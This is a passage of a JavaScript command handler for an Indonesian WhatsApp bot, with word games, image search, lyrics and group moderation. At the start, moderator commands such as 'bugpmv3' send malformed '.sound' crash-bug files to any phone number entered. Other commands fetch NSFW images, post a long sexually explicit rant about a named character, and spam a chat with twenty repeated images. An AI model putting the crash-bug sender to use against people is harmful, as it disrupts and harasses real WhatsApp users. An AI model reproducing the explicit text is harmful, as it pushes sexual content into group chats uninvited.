XeonBotInc.sendMessage(`${args[0]}@s.whatsapp.net`, {document: lodaChoos, mimetype: 'application/octet-stream', fileName:`${BotName} ${xeonbut2}.sound` }, {quoted:doc})
reply (`sᴜᴋsᴇs ᴍᴇɴɢɪʀɪᴍ ʙᴜɢ ✅`)
}
break
case 'bugpmv3': {
if (!isMod) return reply (mess.mod)
if (!args[0]) return reply (`ᴄᴏɴᴛᴏʜ : ${prefix + command} 𝟼𝟸𝟾𝟿𝟷𝟶𝟷𝟷𝟷𝟸𝟷𝟹`)
 lodaChoos2 = fs.readFileSync('./Rimed/randiKaBaccha.sound')
 XeonBotInc.sendMessage(`${args[0]}@s.whatsapp.net`, {document: lodaChoos2, mimetype: '', fileName:`${BotName} ${xeonbut2}.sound` }, {quoted:doc})
 reply (`sᴜᴋsᴇs ᴍᴇɴɢɪʀɪᴍ ʙᴜɢ!`)
 }
 break



//
case 'ass': case 'bdsm': case 'cum':
case 'maid': case 'panties': case 'orgy':
case 'cuckold': case 'netorare': case 'blowjob':
case 'feet': case 'pussy': case 'gangbang':
case 'cumslut': case 'thighs': case 'masturbation':
case 'school': case 'yuri':{
if (!m.isGroup) return reply (mess.grouponly)
if (!AntiNsfw) return reply (mess.nonsfw)
if (isBan) return reply (mess.banned)
if (isBanChat) return reply (mess.bangc)
reply (mess.waiting)
nye = `https://megayaa.herokuapp.com/api/akaneko/${command}`
let asukowe = [{buttonId: `-dongnasi`, buttonText:{displayText:`ʙᴀɴᴛᴜ ʙᴏᴛ ᴀɢᴀʀ ᴛᴇᴛᴀᴘ ʜɪᴅᴜᴘ!`},type:1}]
let buttonasu ={
image : {url:nye},
caption : `sɪʟᴀʜᴋᴀɴ ᴛᴜᴀɴ!`,
buttons : asukowe,
headerType : 1
}
await XeonBotInc.sendMessage(m.chat, buttonasu, {quoted : m}).catch(err=>{return(`Engror banh`)
})
}
break

case 'family100': {
if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)
if ('family100'+m.chat in _family100) {
reply('ᴀᴅᴀ ᴋᴜɪs ʏᴀɴɢ ʙᴇʟᴜᴍ ᴅɪsᴇʟᴇsᴀɪᴋᴀɴ!!!')
reply(false)
}
let anu = await fetchJson('https://raw.githubusercontent.com/RiAdrianm/database/master/games/family100.json')
let random = anu[Math.floor(Math.random() * anu.length)]
let hasil = `ᴊᴀᴡᴀʙʟᴀʜ ᴘᴇʀᴛᴀɴʏᴀᴀɴ ʙᴇʀɪᴋᴜᴛ ɪɴɪ. :\n${random.soal}\n\nᴀᴅᴀ *${random.jawaban.length}* ᴊᴀᴡᴀʙᴀɴ ${random.jawaban.find(v => v.includes(' ')) ? `(ʙᴇʙᴇʀᴀᴘᴀ ᴊᴀᴡᴀʙᴀɴ ᴍᴇᴍɪʟɪᴋɪ sᴘᴀsɪ)` : ''}`.trim()
_family100['family100'+m.chat] = {
id: 'family100'+m.chat,
pesan: await XeonBotInc.sendText(m.chat, hasil, m),...random,
terjawab: Array.from(random.jawaban, () => false),
hadiah: 6,}
}
break



case 'tebakkalimat':{
if (isBan) return reply (mess.ban)
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) return replay(`ᴀᴅᴀ ᴘᴇʀᴍᴀɪɴᴀɴ ʏᴀɴɢ ʙᴇʟᴜᴍ ᴅɪsᴇʟᴇsᴀɪᴋᴀɴ!!!`)
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    XeonBotInc.sendText(m.chat, `sɪᴋᴀʜᴋᴇᴜɴ ᴊᴀᴡᴀʙ sᴏᴀʟ ᴅɪʙᴀᴡᴀʜ ɪɴɪ!!\n-----------\n${result.soal}\n-----------\nᴡᴀᴋᴛᴜ ᴍᴇɴᴊᴀᴡᴀʙ 𝟼𝟶ᴅᴇᴛɪᴋ ᴅɪᴍᴜʟᴀɪ ᴅᴀʀɪ sᴇᴋᴀʀᴀɴɢ!!!\n\nᴊᴀᴡᴀʙɴʏᴀ ᴘᴀᴋᴇ ʜᴜʀᴜғ ᴋᴇᴄɪʟ sᴇᴍᴜᴀ ʏᴀʜ!`, m).then(() => {
                    tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
XeonBotInc.sendMessage(m.chat, {text : `ᴡᴀᴋᴛᴜ ᴍᴇɴᴊᴀᴡᴀʙ ᴛᴇʟᴀʜ ʜᴀʙɪs\n\nᴊᴀᴡᴀʙᴀɴɴʏᴀ ᴀᴅᴀʟᴀʜ : ${tebakkalimat[m.sender.split('@')[0]]}`},{quoted : m})
                    delete tebakkalimat[m.sender.split('@')[0]]
                    }
                }
break
case 'tebakkata':{
if (isBan) return reply (`Turu`)
if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) return replay(`ᴀᴅᴀ ᴘᴇʀᴍᴀɪɴᴀɴ ʏᴀɴɢ ʙᴇʟᴜᴍ ᴅɪsᴇʟᴇsᴀɪᴋᴀɴ!!!`)
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
let result = anu[Math.floor(Math.random() * anu.length)]
XeonBotInc.sendText(m.chat, `sᴏᴀʟ : ${result.soal}\n\nᴡᴀᴋᴛᴜ ᴍᴇɴᴊᴀᴡᴀʙ 𝟼𝟶ᴅᴇᴛɪᴋ ᴅɪᴍᴜʟᴀɪ ᴅᴀʀɪ sᴇᴋᴀʀᴀɴɢ!!!\n\nᴊᴀᴡᴀʙɴʏᴀ ᴘᴀᴋᴇ ʜᴜʀᴜғ ᴋᴇᴄɪʟ sᴇᴍᴜᴀ ʏᴀʜ!`, m).then(() => {
                    tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    XeonBotInc.sendMessage(m.chat, {image : {url :'https://telegra.ph/file/784d202c3a634bc7140c9.jpg' }, caption : `ᴡᴀᴋᴛᴜ ᴍᴇɴᴊᴀᴡᴀʙ ᴛᴇʟᴀʜ ʜᴀʙɪs!\n\nᴊᴀᴡᴀʙᴀɴɴʏᴀ ᴀᴅᴀʟᴀʜ : ${tebakkata[m.sender.split('@')[0]]}`}, {quoted : m})
                    delete tebakkata[m.sender.split('@')[0]]
                    }
}
		
break		


		
case 'tebakgambar':{
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) return replay(`ᴀᴅᴀ ᴘᴇʀᴍᴀɪɴᴀɴ ʏᴀɴɢ ʙᴇʟᴜᴍ ᴅɪsᴇʟᴇsᴀɪᴋᴀɴ!!!`)
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
let result = anu[Math.floor(Math.random() * anu.length)]
XeonBotInc.sendImage(m.chat, result.img, `Clue : ${result.deskripsi}\n\nnᴡᴀᴋᴛᴜ ᴍᴇɴᴊᴀᴡᴀʙ 𝟼𝟶ᴅᴇᴛɪᴋ ᴅɪᴍᴜʟᴀɪ ᴅᴀʀɪ sᴇᴋᴀʀᴀɴɢ!!!\nᴊᴀᴡᴀʙɴʏᴀ ᴘᴀᴋᴇ ʜᴜʀᴜғ ᴋᴇᴄɪʟ sᴇᴍᴜᴀ ʏᴀʜ!`, m).then(() => {
tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
XeonBotInc.sendMessage(m.chat, {image : {url : 'https://telegra.ph/file/827fbd7afbcf586dacbce.jpg'}, caption : `ᴡᴀᴋᴛᴜ ᴍᴇɴᴊᴀᴡᴀʙ ᴛᴇʟᴀʜ ʜᴀʙɪs!\n\nᴊᴀᴡᴀʙᴀɴɴʏᴀ ᴀᴅᴀʟᴀʜ : ${tebakgambar[m.sender.split('@')[0]]}`},{quoted : m})
                    delete tebakgambar[m.sender.split('@')[0]]
                    }
        
}
break

case 'caklontong':{
if (isBan) return reply (mess.ban)
if (caklontong.hasOwnProperty(m.sender.split('@')[0])) return replay(`ᴀᴅᴀ ᴘᴇʀᴍᴀɪɴᴀɴ ʏᴀɴɢ ʙᴇʟᴜᴍ ᴅɪsᴇʟᴇsᴀɪᴋᴀɴ!!!`)
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                   XeonBotInc.sendText(m.chat, `ᴊᴀᴡᴀʙʟᴀʜ sᴏᴀʟ ᴅɪʙᴀᴡᴀʜ ɪɴɪ!\n\n*${result.soal}*\n\nᴡᴀᴋᴛᴜ ᴍᴇɴᴊᴀᴡᴀʙ 𝟼𝟶ᴅᴇᴛɪᴋ ᴅɪᴍᴜʟᴀɪ ᴅᴀʀɪ sᴇᴋᴀʀᴀɴɢ!!!\nᴊᴀᴡᴀʙɴʏᴀ ᴘᴀᴋᴇ ʜᴜʀᴜғ ᴋᴇᴄɪʟ sᴇᴍᴜᴀ ʏᴀʜ!`, m).then(() => {
                    caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
		    caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
                    })
                    await sleep(60000)
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    XeonBotInc.sendMessage(m.chat, {image : {url :'https://telegra.ph/file/827fbd7afbcf586dacbce.jpg' }, caption : `ᴡᴀᴋᴛᴜ ᴍᴇɴᴊᴀᴡᴀʙ ᴛᴇʟᴀʜ ʜᴀʙɪs!\n\nᴊᴀᴡᴀʙᴀɴɴʏᴀ ᴀᴅᴀʟᴀʜ :  ${caklontong[m.sender.split('@')[0]]}\nᴘᴇɴᴊᴇʟᴀsᴀɴ : ${caklontong_desk[m.sender.split('@')[0]]}\n\nᴊᴀɴɢᴀɴ ɴɢᴀᴍᴜᴋ ᴋᴇ ʙᴏᴛ ᴋᴀᴋ ,ɴɢᴀᴍᴜᴋɴʏᴀ ᴋᴇ ᴄᴀᴋ ʟᴏɴᴛᴏɴɢ sᴏɴᴏ:ᴠsono:v`}, {quoted : m})
                    delete caklontong[m.sender.split('@')[0]]
		    delete caklontong_desk[m.sender.split('@')[0]]
                    }
                }
            
            
            break		
		
		
case 'pornhub2':
   if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)
if(!q) return reply(`Use ${prefix + command} text`)
reply(mess.waiting)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/pornhub-style-logo-online-generator-free-977.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => XeonBotInc.sendMessage(m.chat, { image: { url: data }, caption: `Made by ${BotName}` }, { quoted: m }))
  .catch((err) => console.log(err));
   break
case 'pornhub':{
	if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)
if(!q) return reply(`Example: ${prefix + command} Miuna|Bot`)
reply(mess.waiting)
  inilogo4 = args.join(" ")
inilogo9 = args.join(" ")
   var logo4 = inilogo4.split('|')[0]
var logo9 = inilogo9.split('|')[1]
    let anu = await textpro("https://textpro.me/pornhub-style-logo-online-generator-free-977.html", [`${logo4}`,`${logo9}`])
XeonBotInc.sendMessage(from,{image:{url:anu}, caption:"Nihh Bang"},{quoted:m})
}
break		
		
case 'suitpvp': case 'suit': {
            this.suit = this.suit ? this.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) return replay(`Selesaikan Suitmu Terlebih Dahulu!`)
	    if (m.mentionedJid[0] === m.sender) return reply(`Can't Play With Myself !`)
            if (!m.mentionedJid[0]) return reply(`_Kamu Mau Bertanding?_\nTag Orang yang mau dilawan..\n\nContoh : ${prefix}suit @mamatasu`)
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0])))  reply(`Orang Yang Kamu tantang sedang bermain bersama orang lain! :(`)
            let id = 'suit_' + new Date() * 1
            let caption = `_*SUIT PvP*_
@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} Untuk Melakukan Suit
Tolong @${m.mentionedJid[0].split`@`[0]} Ketik *Setuju* Untuk menerima tantangan dan ketik *Males* untuk menolak`
            this.suit[id] = {
            chat: await XeonBotInc.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) XeonBotInc.sendText(m.chat, `_Waktu Suit Telah Habis_`, m)
            delete this.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            break		
		case 'addmsg': {
            	if (isBan) return reply(mess.ban)
	if (isBanChat) return reply(mess.banChat)
                if (!m.quoted) return reply(`Reply Message You Want To Save In Database`)
                if (!text) return reply(`Example : ${prefix + command} File Name`)
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) return reply(`'${text}' Has Been Registered In The Message List`)
                msgs[text.toLowerCase()] = quoted.fakeObj
reply(`Successfully Added Message In Message List As '${text}'
    
Access With ${prefix}getmsg ${text}

View List Of Messages With ${prefix}listmsg`)
            }
            break
	case 'getmsg': {
                if (!text) return reply(`Example : ${prefix + command} file name\n\nView Message List With ${prefix}listmsg`)
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) return reply(`'${text}' Not Listed In The Message List`)
                XeonBotInc.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./database/database.json'))
	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = '「 DATABASE LIST 」\n\n'
		for (let i of seplit) {
		    teks += `🐕 *Name :* ${i.nama}\n🐕 *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        reply(teks)
	    }
	    break
            case 'delmsg': case 'deletemsg': {
	        let msgs = global.db.data.database
	        if (!(text.toLowerCase() in msgs)) return reply(`'${text}' Not Listed In The Message List`)
		delete msgs[text.toLowerCase()]
		reply(`Delete Successfully '${text}' From The Message list`)
            }
	    break	
		
		
            case 'setnamabot': case 'setnamebot': {
	    if (!isCreator) return replay(mess.botowner)
            if (!text) return m.reply(`Contoh: ${prefix + command} WhatsApp ✅`)
            let name = await XeonBotInc.updateProfileName(text)
            m.reply(`_Nama bot berhasil diubah_`)
            }
            break
 case 'setpp': {
                if (!isCreator) throw mess.owner
                if (!/image/.test(mime)) return replay( `Kirim/Reply Image Dengan Caption ${prefix + command}` )
                if (/webp/.test(mime)) return replay( `Kirim/Reply Image Dengan Caption ${prefix + command}` )
                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                await XeonBotInc.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.jobdone)
                }
                break
	
	

case 'lewd' :
reply (mess.lewd)
break

	
	
	case 'request': case 'req' :{
if (m.isGroup)	return reply (`Fitur Ini hanya berlaku dichat pribadi/Private Message`)		
if (!text) return reply(`Tolong Tulis Nama Lengkap Karakter Berserta Asal Usulnya! \n\nContoh Request Karakter Dari Game : ${prefix + command} karakter Sangonomiya Kokomi Dari Game Genshit Impact\n\nContoh Request karakter dari anime : ${prefix + command} Fujiwara Chika Dari Anime Kaguya-Sama Love Is War\n\nContoh Request Artist : ${prefix + command} https://soraneko.fanbox.cc/ \n\nJika Hanya menulis nama lengkap karakter saja(tidak dengan asal usulnya), maka request'anmu tidak akan direspon!!!\n\nHarap Join GC dibawah ini agar nnti jika request'anmu dipost akan diTag\nhttps://chat.whatsapp.com/CLwGABzGLrn13nOmpZKysc\nGajoin? ya gadikabulin :v`)
				XeonBotInc.sendMessage(`120363027296875929@g.us`, {text: `*Hallo Babutachi! , ada yang request karakter nih*\n\n*Pesan : ${text}*\n*Orangnya : ${m.sender}*`,}, {quoted: {key: { fromMe: false,
				participant: `${m.sender}`, ...(from ? { remoteJid: "120363027296875929@g.us" } : {})},
			message: { "extendedTextMessage": {
				"text": `Ada yg request oniichan!`,
				"title": `Pasang iklan murah bang`,
				}}}})
				m.reply(' *Permintaan terkirim*\nPerlu Diingat, Satu orang hanya bisa merequest 1x. jika ingin merequest lagi maka tunggu 3hari kemudian! \n\n_Harap Join GC dibawah ini agar nnti jika requestmu dipost akan diTag_\nhttps://chat.whatsapp.com/CLwGABzGLrn13nOmpZKysc')
				}
			break	
	
		
    case 'wangy':
    if (isBan) return reply(mess.ban)	 			
    if (isBanChat) return reply(mess.banChat)
                 if (!text) return replay(`Gunakan nama karakternya! \nContoh : *${prefix + command} Keqing*`)           
qq = q.toUpperCase()
                 awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, AHHHHHH BAUNYA ${qq} WANGY SEKALIIII COYYY,  AKU MAU NYIUMIN AROMA WANGY NYAAA. ${qq} AAAAAAAAH ~ RAMBUTNYA.... AHHH RAMBUTNYA JUGA PENGEN AKU ELUS ELUS SAMBIL AKU ENTOT BRUTAL ~ AAAAAH MEMEK ${qq} PASTI SANGAT PINK DAN TENTU SAYA *WANGY* BANGET ❤️ ❤️ ❤️ AAAAAAAH ${qq} AAAAAA CANTIK BANGET ANJENG!............ ${qq} AAAAAAAAAAAAAAAAAAAAGH GATAHAN PENGEN CROTTTTT!! ❤️ ❤️ ❤️Apaan ?  ? ${qq} Engga nyata ? Lu Iri ? BILANG BOSS, SERLOK BRO! ? APA APA APA ? STRESS ? AKU GAPEDULI ANJENG!. ❤️ ❤️ ❤️ ${qq}KU ... ${qq} Selalu memperhatikanku ketika aku coli pake gambarnya. Apa ${qq} ?, Kamu mau ngentot sama aku ?  aaaaaaaaaaah GASKEN ATUH! . ${qq} Mau berapa ronde ? Sampe pagi pun aku gas. ${qq} AHHHH , SLURRPP SLURRPP. Syuurrrr. Kamu Mau Crott ${qq}?. tahan sebentar aku juga mau Croott.  ❤️ ❤️ ❤️  ${qq} AKU AKAN CROOTT SEBANYAK 1TON BIAR BISA MENGISI PENUH RAHIMMU. CROTTTT 💦💦💦💦💦💦 AHHH~`
              await sleep(30000)
                    reply(awikwok)
                
                 break


case 'me': case 'profile': {
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
  if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }
  if (!isInventory){ addInventori(m.sender) }
  if (!isInventoriBuruan){ addInventoriBuruan(m.sender) }
     var flob = await getBuffer(picak+'User Profile')
     var bio= await XeonBotInc.fetchStatus(m.sender)
     var bioo = bio.status
     const adn= isAdmins? "True":"False"
     
     try {
        
        pfp=await XeonBotInc.profilePictureUrl(m.sender, 'image')
    
          } catch (e) {
     
      pfp ='https://wallpapercave.com/wp/wp10524580.jpg'
    }

     const profilexx = `*「  Profile Info  」*\n\n*User Name* : _${pushname}_\n*Bio* : _${bioo}_\n*Group Admin Status* : ${adn}\n*Level* : ${levelMenu}\n*Exp* : ${xpMenu} out of ${reqXp}\n*Title* : ${role}`
 


let buttonspros = [
    {buttonId: `-dongnasi`, buttonText: {displayText: 'Sedekah dapet role :v'}, type: 1}
    ]
            let buttonMessage = {
                image: { url: pfp },
                caption: profilexx,
                footer: `${BotName}`,
                buttons: buttonspros,
                headerType: 4
            }
        XeonBotInc.sendMessage(m.chat,buttonMessage,{quoted:m})
        	}
            break
	
	
		
		
		
		
		
		
      case 'antilink':
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
        reply(` *━━━〈   Antilink   〉━━━*\n\n-antilinkgc (Grup Chat)\n\n-antilinkytch (Youtube Channel)\n\n-antilinkfb (Facebook)\n\n-antiwame (wa.me/xxxx)\n\n-antilinktg (Telegram)\n\n-antilinkytvid (Youtube Video)\n\n-antilinktwit (Twitter)\n\n-antilinktt (Tiktod)\n\n-antilinkig (Instagram)\n\n-antilinkall (Semua Link)`)
    break
		
case 'banchat': case 'bangroup':{
if (isBan) return reply(mess.banned)	 			
if (!isCreator) return replay(mess.botowner)
if (args[0] === "on") {
if (isBanChat) return replay('This Group is Already Banned from using me!')
banchat.push(from)
replay('This Group has been banned from using me!')
var groupe = await XeonBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
XeonBotInc.sendMessage(from, {text: `\`\`\`「 Notice 」\`\`\`\n\nThis group is banned from using bot. So, here nobody can use me anymore!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!isBanChat) return replay('This Group is Already Banned from using me!')
let off = banchat.indexOf(from)
banchat.splice(off, 1)
replay('This Group has been *unbanned* from using me!')
} else {
  let buttonsntnsfw = [
  { buttonId: `-bangroup on`, buttonText: { displayText: 'Ban' }, type: 1 },
  { buttonId: `-bangroup off`, buttonText: { displayText: 'Unban' }, type: 1 }
  ]
  await XeonBotInc.sendButtonText(m.chat, buttonsntnsfw, `Please choose any Button below.\n\n *On / Off*`, `${global.BotName }`, m)
  }
  }
  break

 

	case 'asupan':
		if (args.length == 0) return reply(`Contoh: ${prefix + command} azur_lane\nContoh: ${prefix + command} Albedo_(overlord)`)
         if (!isMod) return replay(mess.mod)
		if (isBan) return reply(mess.banned)
   		 if (isBanChat) return reply(mess.bangc)
		harusdiisi = args.join(" ")
		reply(mess.waiting)
		
nye = `https://api.lolhuman.xyz/api/danbooru?apikey=${lolkey}&query=${harusdiisi}`
XeonBotInc.sendMessage(from, {image:{url:nye}, caption:"Ini kak!"}, {quoted:m})
break	
		case 'update':{
		if (args.length == 0) return reply(`Contoh: ${prefix + command} azur_lane\nContoh: ${prefix + command} Albedo_(overlord)`)
         if (!isMod) return replay(mess.mod)
		if (isBan) return reply(mess.banned)
   		 if (isBanChat) return reply(mess.bangc)
		harusdiisi = args.join(" ")
		reply(mess.waiting)
		
nye = `https://api.lolhuman.xyz/api/danbooru?apikey=${lolkey}&query=${harusdiisi}`
XeonBotInc.sendImage(m.chat , nye)
await sleep(6500)
XeonBotInc.sendImage(m.chat , nye)
await sleep(6500)
XeonBotInc.sendImage(m.chat , nye)
await sleep(6500)
XeonBotInc.sendImage(m.chat , nye)
await sleep(6500)
XeonBotInc.sendImage(m.chat , nye)
await sleep(6500)
XeonBotInc.sendImage(m.chat , nye)
await sleep(6500)
XeonBotInc.sendImage(m.chat , nye)
await sleep(6500)
XeonBotInc.sendImage(m.chat , nye)
await sleep(6500)
XeonBotInc.sendImage(m.chat , nye)
await sleep(6500)
XeonBotInc.sendImage(m.chat , nye)
await sleep(6500)
XeonBotInc.sendImage(m.chat , nye)
await sleep(6500)
XeonBotInc.sendImage(m.chat , nye)
await sleep(6500)
XeonBotInc.sendImage(m.chat , nye)
await sleep(6500)
XeonBotInc.sendImage(m.chat , nye)
await sleep(6500)
XeonBotInc.sendImage(m.chat , nye)
await sleep(6500)
XeonBotInc.sendImage(m.chat , nye)
await sleep(6500)
XeonBotInc.sendImage(m.chat , nye)
await sleep(6500)
XeonBotInc.sendImage(m.chat , nye)
await sleep(6500)
XeonBotInc.sendImage(m.chat , nye)
await sleep(6500)
XeonBotInc.sendImage(m.chat , nye)
}
break	
		


case 'groupbot':
case 'botgrups':
case 'botgroups':
case 'botgrup':
case 'botgroup':
if (isBan) return reply(mess.ban)	 			
if (isBanChat) return reply(mess.banChat)
reply(` Jangan lupa join yak!
*GROUP 1*
https://chat.whatsapp.com/HVPNKrLNDTcHvZ1B0i811h *BPM Update*
*GROUP 2*
https://chat.whatsapp.com/FlY1IkMODONLRQa7FmpXFk *Diskusi Apa Sadja*`)
break	
		
case 'reaksi': case 'react': case 'reactions': case 'r':
        if (isBan) return reply(mess.banned)	 			
        if (isBanChat) return reply(mess.bangc)
            reply(` *━━━〈  📍 Reaksi 📍  〉━━━*\n\n-Bonk    -Cry     -Bully\n-Cuddle    -Hug    -Kiss\n-Lick    -Pat    -Smug\n-Yeet    -Blush    -Smile\n-Wave    -Highfive    -Handhold\n-Nom    -Glomp    -Bite\n-Slap    -Kill    -Happy\n-Wink    -Poke    -Dance\n       -Cringe\n\n*━━━〈  📍 Reaksi 📍  〉━━━* `)
        break   

case 'ringtone': {
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
            if (!args.join(" ")) return reply(`Example: ${prefix}ringtone black over`)
        let { ringtone } = require('./lib/scraper')
		let anu = await ringtone(text)
		let result = anu[Math.floor(Math.random() * anu.length)]
		XeonBotInc.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break


case 'film': case 'movie': case 'moviesearch':
if (isBan) return reply(mess.banned)
	if (isBanChat) return reply(mess.bangc)
	reply(mess.waiting)
if (!q) return reply(`Tolong masukkan judulnya...\nContoh: ${prefix}movie Spiderman`)
xfarrapi.Film(q)
    .then(data => {
    let krl = `*Search Term:* ${q}\n\n`
			    for (let i of data) {
                krl += (`-----------------------------------------------------------------------------\n\n\n*Movie Name:* ${i.judul}\n *Quality :* ${i.quality}\n *Type : ${i.type}*\n *Uploaded on :* ${i.upload}\n *Source URL :* ${i.link}\n\n\n`)
                }
               XeonBotInc.sendMessage(from, { image: { url: data[0].thumb}, caption: krl }, { quoted: fdocs })
});
break

case 'lirik':{
if (!args.join(" ")) return reply ('Emm, Judulnya?')
reply (mess.waiting)
ri = await fetchJson(`https://megayaa.herokuapp.com/api/liriklagu?lagu=${args.join(" ")}`)
judul = ri.result.judul
penyan = ri.result.penyanyi
const thumb = ri.result.thumb
lirik = ri.result.lirik
let buttonn =[ 
{buttonId : `-dongnasi`, buttonText : {displayText :`Sedekah onlen!`},type:1}
]
let buttonMessage = {
image : {url : thumb},
caption : `Judul : ${judul}\nPenyanyi : ${penyan}\n\nLirik : ${lirik}`,
footer : "Miuna",
buttons : buttonn,
headerType : 4
}
XeonBotInc.sendMessage(m.chat, buttonMessage).catch((err) => {
                     reply(`Lirik tidak ditemukan atau Webnya engror!`)
                 })
}
break
case 'wallpaper': case 'animewallpaper': case 'animewall': {
if (isBan) return reply(mess.banned)	 			
if (isBanChat) return reply(mess.bangc)
if (!args.join(" ")) return reply("Please enter a term to search!")
const { AnimeWallpaper } =require("anime-wallpaper")
const wall = new AnimeWallpaper();
const pages = [1,2,3,4];
const random=pages[Math.floor(Math.random() * pages.length)]
        const wallpaper = await wall .getAnimeWall4({ title: q, type: "sfw", page: pages }).catch(() => null);
        const i = Math.floor(Math.random() * wallpaper.length);
		
let buttons = [
            {buttonId: `-dongnasi`, buttonText: {displayText: 'Sedekah Kak!'}, type: 1}
        ]
        let buttonMessage = {
            image: {url:wallpaper[i].image},
            caption: `*Search term:* ${q}`,
            footer: `${BotName}`,
            buttons: buttons,
            headerType: 4
        }
        XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
    }
    break


case 'quotesanime': case 'quoteanime': case 'animequote': case 'animequotes':{
		let { quotesAnime } = require('./lib/scraper')
        let anu = await quotesAnime()
        hasil = anu[Math.floor(Math.random() * anu.length)]
        let buttons = [
            {buttonId: `-quotesanime`, buttonText: {displayText: '>>'}, type: 1}
        ]
        let buttonMessage = {
            text: `_${hasil.quotes}_\n\nBy '${hasil.karakter}', ${hasil.anime}\n\n- ${hasil.up_at}`,
            footer: 'Miuna',
            buttons: buttons,
            headerType: 2
        }
        XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
    }
    break


 case 'emoji': {
    if (isBan) return reply(mess.banned)	 			
if (isBanChat) return reply(mess.bangc)
if (!args.join(" ")) return reply('Where is the emoji?')
emoji.get(args.join(" ")).then(async(emoji) => {
let mese = await XeonBotInc.sendMessage(m.chat, {image:{url:emoji.images[4].url}, caption: `Here it is...`}, {quoted:m})
await XeonBotInc.sendMessage(from, {text:"reply -s to this image to make sticker"}, {quoted:mese})
})
}
break

 case 'listpc': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v)
 let teks = ` 「  Isi Chat Miuna  」\n\nTotal ${anu.length} Orang yang ngechat Miuna.`
 for (let i of anu) {
  teks += `\n\nProfile : @${i.id.split('@')[0]}\nChat : ${i.unreadCount}\nLastchat : ${moment(i.conversationTimestamp * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`
 }
 XeonBotInc.sendTextWithMentions(m.chat, teks, m)
 }
 break

 case 'listgc': {
    if (isBan) return reply(mess.banned)	 			
 if (isBanChat) return reply(mess.bangc)
 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
 let teks = ` 「  List Grup Miuna  」\n\nTotal ada ${anu.length} Grup yang menggunakan Miuna.`
 for (let i of anu) {
  let metadata = await XeonBotInc.groupMetadata(i)
  if (metadata.owner === "undefined") {
  loldd = false
  } else {
  loldd = metadata.owner
  }
  teks += `\n\nNama Grup : ${metadata.subject ? metadata.subject : "undefined"}\nAdmin : ${loldd ? '@' + loldd.split("@")[0] : "undefined"}\nID : ${metadata.id ? metadata.id : "undefined"}\ntanggal grup dibuat : ${metadata.creation ? moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss') : "undefined"}\nAnggota : ${metadata.participants.length ? metadata.participants.length : "undefined"}`
 }
